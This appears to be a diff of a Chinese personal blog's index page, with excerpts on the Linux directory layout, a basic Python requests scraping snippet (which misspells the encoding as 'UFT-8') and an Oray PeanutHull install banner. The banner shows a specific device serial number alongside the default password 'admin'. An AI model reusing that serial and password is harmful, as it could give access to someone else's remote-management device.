+<p>​		如：&#x2F;etc&#x2F;passwd 用户信息文件 	</p>
+<p>​				&#x2F;etc&#x2F;shadow 用户密码文件	</p>
+<p>​				&#x2F;etc&#x2F;group 存储用户组信息 	</p>
+<p>​				&#x2F;etc&#x2F;fstab 系统开机启动自动挂载分区列表 	</p>
+<p>​				&#x2F;etc&#x2F;hosts 设定用户自己的 IP 与主机名对应的信息</p>
+<p>​		 &#x2F;home 普通用户的家目录默认存放目录</p>
+<p>​		 &#x2F;lib 库文件存放目录,函数库目录</p>
+<p>​		 &#x2F;mnt &#x2F;media &#x2F;mnt 和&#x2F;media 一般用来临时挂载存储设备的挂载目录，比如有 cdrom、U 盘 等目录 &#x2F;mnt&#x2F;hgfs: 安装 vmware-tools 后，使用共享文件夹功能，可以共享虚 拟机和真机的目录，实现文件相互复制，一般这个功能没有用。我们直接使用 xshell 来上传文件 </p>
+<p>​		&#x2F;opt 表示的是可选择的意思，有些软件包也会被安装在这里。如：gitlab &#x2F;proc 操作系统运行时，进程（正在运行中的程序）信息及内核信息（比如 cpu、硬盘 分区、内存信息等）存放在这里。</p>
+<p>​		&#x2F;proc 目录是伪装的文件系统 proc 的挂载目 录，proc 并不是真正的文件系统。因此，这个目录是一个虚拟的目录，它是系统 内存的映射，我们可以通过直接访问这个目录来获取系统信息。也就是说，这个 目录的内容不在硬盘上而是在内存里 查看咱们的 CPU 信息 cat &#x2F;proc&#x2F;cpuinfo &#x2F;sys 系统目录，存放硬件信息的相关文件</p>
+<p>​		 &#x2F;run 运行目录，存放的是系统运行时的数据，比如进程的 PID 文件</p>
+<p>​		 &#x2F;srv 服务目录，存放的是我们本地服务的相关文件</p>
+<p>​		 &#x2F;sbin 大多数涉及系统管理的命令都存放在该目录中，它是超级权限用户 root 的可 执行命令存放地，普通用户无权限执行这个目录下的命令，凡是目录 sbin 中包含 的命令都是 root 权限才能执行的 </p>
+<p>​		 &#x2F;tmp 该目录用于存放临时文件，有时用户运行程序的时候，会产生一些临时文 件。&#x2F;tmp 就是用来存放临时文件的。&#x2F;var&#x2F;tmp 目录和该目录的作用是相似的, 不能存放重要数据，系统会定期删除这个目录下的没有被使用的文件。 它的权限比较特殊 [root@xuegod63 ~]# ls -ld &#x2F;tmp drwxrwxrwt 10 root root 12288 Oct 3 20:45 &#x2F;tmp&#x2F; →粘滞位（sticky bit）目录的 sticky 位表示这个目录里的文件只能被文件的 owner（所有者）和 root 删除 &#x2F;var 系统运行和软件运行时产生的日志信息，该目录的内容是经常变动的，存放的是 一些变化的文件。比如&#x2F;var 下有&#x2F;var&#x2F;log 目录用来存放系统日志的目录，还有 mail、&#x2F;var&#x2F;spool&#x2F;cron </p>
+<p>​		 &#x2F;usr 存放应用程序和文件， &#x2F;usr&#x2F;bin 普通用户使用的应用程序 &#x2F;usr&#x2F;sbin 管理员使用的应用程序 &#x2F;usr&#x2F;lib 库文件 Glibc(32 位) &#x2F;usr&#x2F;lib64 库文件 Glibc &#x2F;lib &#x2F;lib64 是 &#x2F;usr&#x2F;lib 和 这个目录里存放着系统最基本的动态链接共享库，包含许多被&#x2F;bin&#x2F;和&#x2F;sbin&#x2F;中的 程序使用的库文件，目录&#x2F;usr&#x2F;lib&#x2F;中含有更多用于用户程序的库文件。作用类似 于 windows 里的 DLL 文件，几乎所有的应用程序都需要用到这些共享库 注：lib***.a 是静态库 ， lib***.so 是动态库</p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2023/07/26/rocky%208.6/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-爬虫" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="爬虫"><a href="#爬虫" class="headerlink" title="爬虫"></a>爬虫</h1><h2 id="requests爬取网页内容"><a href="#requests爬取网页内容" class="headerlink" title="requests爬取网页内容"></a>requests爬取网页内容</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://www.xxxxxx.com&quot;</span>  <span class="comment">#设置目标</span></span><br><span class="line"></span><br><span class="line">r = requests.get(url)   <span class="comment">#连接</span></span><br><span class="line">r.status_code <span class="comment">#查看连接状态</span></span><br><span class="line">r.encoding <span class="comment">#查看编码方式</span></span><br><span class="line">r.encoding = <span class="string">&quot;UFT-8&quot;</span>  <span class="comment">#改变编码查看方式</span></span><br><span class="line">r.text   <span class="comment">#爬取页面的内容</span></span><br><span class="line">r.headers </span><br><span class="line">r.cookies</span><br></pre></td></tr></table></figure>
+
+<h2 id="url管理器"><a href="#url管理器" class="headerlink" title="url管理器"></a>url管理器</h2>
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2023/07/22/%E7%88%AC%E8%99%AB/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-花生壳" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>————————————————-+<br> |             Oray PeanutHull Linux 5.2.0          |<br> +————————————————–+<br> |  SN: oray98b1d25769bc   Default password: admin  |<br> +————————————————–+<br> |    Remote Management Address <a target="_blank" rel="noopener" href="http://b.oray.com/">http://b.oray.com</a>   |<br> +————————————————–+</p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2023/06/11/%E8%8A%B1%E7%94%9F%E5%A3%B3/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+  
+    <nav id="page-nav">
+      <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/2/">Next &amp;raquo;</a>
+    </nav>
   
 
 
@@ -394,10 +907,6 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
             <input type="checkbox" q-on="click:toggleTag(e)" q-attr="checked:showTags">
           </label>
           <ul class="article-tag-list" q-show="showTags">
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">hexo</a>
-              </li>
             
             <div class="clearfix"></div>
           </ul>
